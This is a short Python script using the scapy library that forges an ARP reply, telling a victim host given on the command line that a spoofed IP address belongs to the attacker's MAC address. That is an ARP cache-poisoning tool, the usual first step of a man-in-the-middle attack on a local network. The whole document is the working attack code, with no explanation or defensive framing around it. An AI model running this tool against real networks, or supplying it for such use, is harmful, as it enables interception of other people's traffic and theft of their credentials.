from scapy.all import ARP, send
import sys


def send_arp_reply(victim_ip, victim_mac, spoof_ip, attacker_mac):
    arp_response = ARP(
        op=2,
        psrc=spoof_ip,
        hwsrc=attacker_mac,
        pdst=victim_ip,
        hwdst=victim_mac
    )
    send(arp_response, verbose=False)


if __name__ == "__main__":
    if len(sys.argv) != 5:
        sys.exit(1)

    victim_ip = sys.argv[1]
    victim_mac = sys.argv[2]
    spoof_ip = sys.argv[3]
    attacker_mac = sys.argv[4]

    send_arp_reply(victim_ip, victim_mac, spoof_ip, attacker_mac)
